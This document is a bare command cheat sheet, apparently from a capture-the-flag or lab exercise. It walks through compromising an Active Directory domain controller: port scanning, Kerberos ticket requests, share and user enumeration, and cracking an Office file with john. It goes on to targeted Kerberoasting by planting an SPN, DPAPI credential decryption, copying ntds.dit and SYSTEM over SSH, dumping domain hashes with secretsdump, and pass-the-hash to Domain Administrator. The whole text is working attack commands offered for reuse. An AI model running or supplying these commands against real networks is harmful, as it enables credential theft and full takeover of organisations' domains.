# ============ Recon ============

```bash
nmap -p- --min-rate 10000 $IP
nmap -p 53,88,135,139,389,445,464,593,636,5985,3268,3269,9389,2222 -sCV $IP
echo -e "$IP\t$DC $DOMAIN_LO ${DC%%.*}" | sudo tee -a /etc/hosts
```

# ============ Kerb Preflight ============

```bash
sudo ntpdate $DC
```

# (edit krb5.conf for $DOMAIN_UP and $IP)

# ============ Kerb TGT ============

```bash
impacket-getTGT "$DOMAIN_UP/$USER:$PASS" -dc-ip $IP
export KRB5CCNAME="$USER.ccache"
klist $KRB5CCNAME
```

# ============ SMB/LDAP via Kerb ============

```bash
nxc smb $DC -k -u $USER -p "$PASS" --users
nxc smb $DC -k -u $USER -p "$PASS" --shares
impacket-smbclient -k -no-pass "$DOMAIN_UP/$USER@$DC"
```

# ============ BloodHound ============

```bash
rusthound -d $DOMAIN_LO -u $USER -p "$PASS" -c All -dc $DC -ns $IP --zip
```

# ============ Crack Office ============

```bash
office2john Access_Review.xlsx > office.hash
john office.hash --wordlist=/usr/share/wordlists/rockyou.txt
msoffcrypto-tool Access_Review.xlsx Access_Review_decrypted.xlsx -p 'CRACKED'
```

# ============ Targeted Kerberoast ============

```bash
bloodyAD -d $DOMAIN_LO --host $DC -u $USER -p "$PASS" -k \
  set object svc_winrm servicePrincipalName -v 'http/whatever'
python3 /usr/share/doc/python3-impacket/examples/GetUserSPNs.py \
  -dc-ip $IP $DOMAIN_UP/$USER -k -no-pass -request > kerberoast.hashes
john kerberoast.hashes --wordlist=/usr/share/wordlists/rockyou.txt
```

# ============ WinRM (Kerb) ============

```bash
export KRB5CCNAME="svc_winrm.ccache"
evil-winrm -i $DC -r $DOMAIN_LO -k -u svc_winrm
```

# ============ Restore deleted AD user ============

```bash
bloodyAD --host $DC -d $DOMAIN_LO -u $USER -p "$PASS" -k restore 'todd.wolfe'
```

# ============ DPAPI offline ============

```bash
impacket-dpapi masterkey -file <GUID> -sid <USER_SID> -password '<PASS>'
impacket-dpapi credential -file <CRED> -key 0x<MASTERKEY_HEX>
```

# ============ WSL / SSH ============

```bash
ssh -i id_rsa -p 2222 user@$DC
scp -i id_rsa -P 2222 user@$DC:'/mnt/c/.../ntds.dit' .
scp -i id_rsa -P 2222 user@$DC:'/mnt/c/.../SYSTEM' .
```

# ============ NTDS offline dump ============

```bash
impacket-secretsdump -ntds ./ntds.dit -system ./SYSTEM LOCAL
```

# ============ DA via hash (Kerb) ============

```bash
impacket-getTGT "$DOMAIN_UP/Administrator" -hashes aad3...:$NT -dc-ip $IP
export KRB5CCNAME="Administrator.ccache"
impacket-wmiexec -k -no-pass "$DOMAIN_UP/Administrator@$DC"
```

# or:

```bash
evil-winrm -i $DC -r $DOMAIN_LO -k -u Administrator
```
